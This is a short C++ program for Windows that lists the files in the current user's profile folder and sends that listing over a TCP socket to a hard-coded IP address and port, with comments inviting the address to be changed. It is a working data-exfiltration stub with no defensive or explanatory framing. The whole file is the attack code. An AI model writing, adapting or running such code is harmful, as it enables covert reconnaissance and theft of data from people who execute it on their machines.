#include <iostream>
#include <winsock.h>
#include <string>
#include <dirent.h>

using namespace std;

struct sockaddr_in srv;

int main() {
	
	string data;

	DIR *dir;
	struct dirent *ent;

	dir = opendir(getenv("USERPROFILE"));
	while ((ent = readdir (dir)) != NULL) {
	    data += ent->d_name;
	    data += "\n";
	 }
	closedir (dir);

	WSADATA ws;
	WSAStartup(MAKEWORD(2, 2), &ws);
	
	const char* IP = "192.168.1.3";    // change
	int PORT = 8080;                  // change
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	srv.sin_family = AF_INET;
	srv.sin_addr.s_addr = inet_addr(IP);
	srv.sin_port = htons(PORT);

	connect(sock, (sockaddr*)&srv, sizeof(srv));
	send(sock, data.c_str(), data.length(), 0);

	return 0;

}
